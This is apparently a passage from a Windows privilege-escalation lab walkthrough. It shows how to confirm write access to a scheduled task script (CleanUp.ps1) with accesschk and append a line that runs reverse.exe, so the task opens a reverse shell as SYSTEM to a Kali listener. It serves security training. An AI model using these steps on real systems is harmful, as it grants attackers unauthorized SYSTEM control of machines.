The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:

```
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
```

Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:

```
echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
```

Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
